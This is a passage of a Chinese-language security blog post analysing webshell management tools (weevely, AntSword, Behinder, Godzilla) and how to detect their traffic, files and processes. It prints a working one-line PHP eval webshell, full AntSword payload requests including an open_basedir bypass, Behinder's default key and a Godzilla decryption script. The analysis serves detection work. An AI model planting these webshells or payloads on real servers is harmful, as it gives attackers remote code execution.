+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209222616491.png" alt="image-20220209222616491"></p>
+<p>获取到一句话的密码后，在把变量内的数据进行base64解码，再通过eval函数执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125;\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>
+
+<p>eval函数后带%01的字符，这样的写法在高版本的php中是无法执行，但低版本中会抛出告警后执行。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209223039502.png" alt="image-20220209223039502"></p>
+<h3 id="3、检测技巧"><a href="#3、检测技巧" class="headerlink" title="3、检测技巧"></a>3、检测技巧</h3><p>一般根据关键函数特征进行检测判断。如php的代码执行函数和命令执行函数。</p>
+<h2 id="0x02-weevely"><a href="#0x02-weevely" class="headerlink" title="0x02 weevely"></a>0x02 weevely</h2><h3 id="1、配置使用-1"><a href="#1、配置使用-1" class="headerlink" title="1、配置使用"></a>1、配置使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weevely也叫linux下的php菜刀，是一款使用python编写的webshell工具，集webshell生成和连接于一身，采用c/s模式构建。</span><br><span class="line">其具有很好的隐蔽性（生成随机参数且base64加密）。</span><br><span class="line">集成服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等功能。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209225642408.png" alt="image-20220209225642408"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220209225715536.png" alt="image-20220209225715536"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210000740214.png" alt="image-20220210000740214"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210001920704.png" alt="image-20220210001920704"></p>
+<p>通过对最后的变量进行打印输出，可以看到weevely生成的后门利用了base64加密方法结合字符串变形技巧，首层不会出现敏感函数只有<code>str_replace</code>函数，在还原到第二层的时候才看到譬如<code>create_function</code>、<code>php:input</code>、<code>file_get_contents</code>、<code>eval</code>、<code>gzuncompress</code>、<code>gzcompress</code>等函数。</p>
+<h3 id="2、流量特征-1"><a href="#2、流量特征-1" class="headerlink" title="2、流量特征"></a>2、流量特征</h3><p>从流量侧明显看不到任何特征</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210002605520.png" alt="image-20220210002605520"></p>
+<h3 id="3、检测技巧-1"><a href="#3、检测技巧-1" class="headerlink" title="3、检测技巧"></a>3、检测技巧</h3><p>尽管在控制通道的流量侧无法进行特征检测，但可以在数据通道（上传过程）的流量侧进行分析。</p>
+<p>weevely生成的后门利用了base64加密方法和字符串变形技巧，以此作为特征可进行检测。</p>
+<h2 id="0x03-antSword"><a href="#0x03-antSword" class="headerlink" title="0x03 antSword"></a>0x03 antSword</h2><h3 id="1、配置使用-2"><a href="#1、配置使用-2" class="headerlink" title="1、配置使用"></a>1、配置使用</h3><p>中国蚁剑是一款开源的跨平台网站管理工具。为不同层次的人群提供最简单易懂、方便直接的代码展示及其修改说明，存在丰富的插件和生态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210131954569.png" alt="image-20220210131954569"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;ant&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210132053734.png" alt="image-20220210132053734"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143610892.png" alt="image-20220210143610892"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143538128.png" alt="image-20220210143538128"></p>
+<h3 id="2、流量特征-2"><a href="#2、流量特征-2" class="headerlink" title="2、流量特征"></a>2、流量特征</h3><p>默认配置下的antSword，其payload不做任何处理。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210133409194.png" alt="image-20220210133409194"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210133346898.png" alt="image-20220210133346898"></p>
+<p>测试连接数据包获取了服务端相关信息，输入到缓冲区再由output变量接收，通过随机字符作为开始结束符定位变量输出位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.d22dd2d652c&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;b6ac94&quot;.&quot;d645b6&quot;;echo @asenc($output);echo &quot;973d1&quot;.&quot;529fb&quot;;&#125;ob_start();try&#123;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dir</span><br></pre></td></tr></table></figure>
+
+
+
+<p>新版antSword的ua也做了随机变换。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210135546731.png" alt="image-20220210135546731"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210135617377.png" alt="image-20220210135617377"></p>
+<p>在内置的rot13编码和解码器下,数据会通过随机变量传递给<code>str_rot13</code>函数，通过变换还原后再交给<code>eval</code>函数执行。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210140050100.png" alt="image-20220210140050100"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210142106462.png" alt="image-20220210142106462"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=@eval(@str_rot13($_POST[&#x27;jac0da8b6de572&#x27;]));&amp;jac0da8b6de572=@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);$bcqve=@vav_trg(&quot;bcra_onfrqve&quot;);vs($bcqve) &#123;$bpjq=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);$bcnee=cert_fcyvg(&quot;/;|:/&quot;,$bcqve);@neenl_chfu($bcnee,$bpjq,flf_trg_grzc_qve());sbernpu($bcnee nf $vgrz) &#123;vs(!@vf_jevgnoyr($vgrz))&#123;pbagvahr;&#125;;$gzqve=$vgrz.&quot;/.n57op&quot;;@zxqve($gzqve);vs(!@svyr_rkvfgf($gzqve))&#123;pbagvahr;&#125;@puqve($gzqve);@vav_frg(&quot;bcra_onfrqve&quot;, &quot;..&quot;);$pagnee=@cert_fcyvg(&quot;/\\\\|\//&quot;,$gzqve);sbe($v=0;$v&lt;fvmrbs($pagnee);$v++)&#123;@puqve(&quot;..&quot;);&#125;;@vav_frg(&quot;bcra_onfrqve&quot;,&quot;/&quot;);@ezqve($gzqve);oernx;&#125;;&#125;;;shapgvba nfrap($bhg)&#123;erghea fge_ebg13($bhg);&#125;;shapgvba nfbhgchg()&#123;$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;251q1&quot;.&quot;3p2oq6&quot;;rpub @nfrap($bhgchg);rpub &quot;81&quot;.&quot;326&quot;;&#125;bo_fgneg();gel&#123;$Q=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q==&quot;&quot;)$Q=qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E=&quot;&#123;$Q&#125;	&quot;;vs(fhofge($Q,0,1)!=&quot;/&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.=&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.=&quot;/&quot;;&#125;$E.=&quot;	&quot;;$h=(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f=($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.=&quot;	&#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE://&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回的报文会交给antSword的对应解码器进行解码还原</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210143012746.png" alt="image-20220210143012746"></p>
+<p>在内置的base64编码和解码器下,数据则会通过随机变量传递给<code>base64_decode</code>函数，通过解码还原后再交给<code>eval</code>函数执行。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210142637595.png" alt="image-20220210142637595"></p>
+<p>在RSA编码解码器下的配置过程</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145618577.png" alt="image-20220210144934347"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145348515.png" alt="image-20220210145348515"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145811080.png" alt="image-20220210145811080"></p>
+<p>把生成的木马放到服务器中，选择RSA编码器进行测试</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210145930612.png" alt="image-20220210145930612"></p>
+<p>在流量中已经看不到任何明显的特征</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210150440658.png" alt="image-20220210150440658"></p>
+<h3 id="3、检测技巧-2"><a href="#3、检测技巧-2" class="headerlink" title="3、检测技巧"></a>3、检测技巧</h3><p>在默认配置或者内置的普通编码器下，可以通过敏感关键函数特征进行检测判断。</p>
+<p>在如RSA编码器下，尽管在控制通道的流量侧无法进行特征检测，但还是可以在数据通道的流量侧进行分析的。</p>
+<h2 id="0x04-rebeyond"><a href="#0x04-rebeyond" class="headerlink" title="0x04 rebeyond"></a>0x04 rebeyond</h2><h3 id="1、配置使用-3"><a href="#1、配置使用-3" class="headerlink" title="1、配置使用"></a>1、配置使用</h3><p>“冰蝎”是一款动态二进制加密网站管理工具。其支持php、jasp、asp、aspx，支持自定义请求头。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180209633.png" alt="image-20220210180209633"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180042426.png" alt="image-20220210180042426"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210181049994.png" alt="image-20220210181049994"></p>
+<h3 id="2、流量特征-3"><a href="#2、流量特征-3" class="headerlink" title="2、流量特征"></a>2、流量特征</h3><p>流量侧不会存在明显的特征</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180652068.png" alt="image-20220210180652068"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210180926672.png" alt="image-20220210180926672"></p>
+<p>对流量进行解密，在结合默认的”e45e329feb5d925b”（该密钥为连接密码32位md5值的前16位）下，首先进行aes解密，然后进行两次base64解码，才可看到执行信息</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210182859530.png" alt="image-20220210182859530"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210183755345.png" alt="image-20220210183755345"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210183843587.png" alt="image-20220210183843587"></p>
+<h3 id="3、检测技巧-3"><a href="#3、检测技巧-3" class="headerlink" title="3、检测技巧"></a>3、检测技巧</h3><p>由于做了加密传输，在流量侧不能通过关键函数进行检测。</p>
+<p>在默认配置下，可以通过报文中的某些字段信息进行检测</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210185120328.png" alt="image-20220210185120328"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210185144952.png" alt="image-20220210185144952"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0&quot;</span><br><span class="line">&quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)&quot;</span><br><span class="line">&quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko&quot;</span><br><span class="line">&quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在数据通道做针对冰蝎木马的检测外。</p>
+<p>在执行命令的过程中冰蝎存在两个父子关系的进程进行操作，还可以通过进程进行检测。</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210181738181.png" alt="image-20220210181738181"></p>
+<h2 id="0x05-Godzilla"><a href="#0x05-Godzilla" class="headerlink" title="0x05 Godzilla"></a>0x05 Godzilla</h2><h3 id="1、配置使用-4"><a href="#1、配置使用-4" class="headerlink" title="1、配置使用"></a>1、配置使用</h3><p>“哥斯拉”和“冰蝎”一样，是一款流量加密的网站管理工具。哥斯拉内置了3种Payload以及6种加密器,6种支持脚本后缀,20个内置插件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成webshell</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210223853362.png" alt="image-20220210223853362"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210224357132.png" alt="image-20220210224357132"></p>
+<p>对于加密器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、JavaDynamicPayload</span><br><span class="line">JAVA_AES_BASE64：jsp、jspx</span><br><span class="line">JAVA_AES_RAW：jsp、jspx</span><br><span class="line"></span><br><span class="line">2、CShapDynamicPayload</span><br><span class="line">CSHAP_AES_BASE64:aspx、asmx、ashx</span><br><span class="line">JAVA_AES_RAW:aspx、asmx、ashx</span><br><span class="line"></span><br><span class="line">3、PhpDynamicPayload</span><br><span class="line">PHP_XOR_BASE64：php</span><br><span class="line">PHP_XOR_RAW：php</span><br><span class="line"></span><br><span class="line">XOR是将数据进行异或处理</span><br><span class="line">Raw是将加密后的数据直接发送或者输出</span><br><span class="line">Base64是将加密后的数据再进行Base64编码</span><br></pre></td></tr></table></figure>
+
+
+
+<p>连接webshell</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210230457328.png" alt="image-20220210230457328"></p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210230534084.png" alt="image-20220210230534084"></p>
+<h3 id="2、流量特征-4"><a href="#2、流量特征-4" class="headerlink" title="2、流量特征"></a>2、流量特征</h3><p>哥斯拉在建立webshell的连接过程中，连续发送三个http数据包</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210233834293.png" alt="image-20220210233834293"></p>
+<p>第一个数据包的响应内容为空</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211000815660.png" alt="image-20220211000815660"></p>
+<p>通过上面生成的webshell，对每个数据包进行逐一解密，把报文数据放到test内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$pass=&#x27;pass&#x27;;</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class="line">$data=encode(base64_decode(&#x27;test&#x27;),$key);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到第一个包解密后存在一些特征代码块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$parameters=array();</span><br><span class="line">$_SES=array();</span><br><span class="line">function run($pms)&#123;</span><br><span class="line">    global $ERRMSG;</span><br><span class="line">    reDefSystemFunc();</span><br><span class="line">    $_SES=&amp;getSession();</span><br><span class="line">    @session_start();</span><br><span class="line">    $sessioId=md5(session_id());</span><br><span class="line">    if (isset($_SESS</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220210235841839.png" alt="image-20220210235841839"></p>
+<p>对第二个包进行解密后的特征字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName...test</span><br></pre></td></tr></table></figure>
+
+<p>（中间带有一些特征看不见的字符）</p>
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211001250430.png" alt="image-20220211001250430"></p>
+<p>第三个包解密后的特征字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName&amp;?/m?&#125;%0K楬F</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/image-20220211001642820.png" alt="image-20220211001642820"></p>
+<h3 id="3、检测技巧-4"><a href="#3、检测技巧-4" class="headerlink" title="3、检测技巧"></a>3、检测技巧</h3><p>除了以上的流量特征和在数据通道做针对哥斯拉的木马的检测外。</p>
+<p>如果没有自定义报文字段，默认配置下的哥斯拉，可以把报文字段作为弱特征检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>另外，哥斯拉在执行命令的过程中存在三个组合的父子进程，也可以类似冰蝎一样检测恶意进程。</p>
